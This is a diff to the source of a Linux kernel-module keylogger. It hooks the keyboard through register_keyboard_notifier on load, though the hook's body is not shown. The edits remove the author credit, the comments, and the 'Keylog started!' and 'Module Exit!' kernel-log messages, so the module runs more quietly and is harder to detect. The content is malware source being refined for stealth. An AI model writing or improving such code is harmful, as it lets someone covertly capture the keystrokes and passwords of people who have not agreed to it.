@@ -4,15 +4,11 @@
 #include <linux/fs.h>
 #include <asm/uaccess.h>
 #include <linux/mm.h>
-
-// Keyboard hook
 #include <linux/keyboard.h>
 #include <linux/semaphore.h>
-
 #include "private.h"
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("d0lph1n98 <d0lph1n98@yahoo.com>");
 
 static int 
 key_hook(struct notifier_block *nblock, unsigned long code, void *_param) 
@@ -44,25 +40,16 @@ static struct notifier_block keyboard_nb = {
     .notifier_call = key_hook
 };
 
-/* Module Init */
 static int
 __init keylog_init(void) 
 {
-    printk(KERN_INFO "Keylog started!\n");
-
-    // Mount keyboard hook
     register_keyboard_notifier(&keyboard_nb);
-
     return 0;
 }
 
-/* Module Exit */
 static void
 __exit keylog_exit(void) 
 {
-    printk(KERN_INFO "Module Exit!\n");
-
-    // Unmount keyboard hook
     unregister_keyboard_notifier(&keyboard_nb);
 }
 
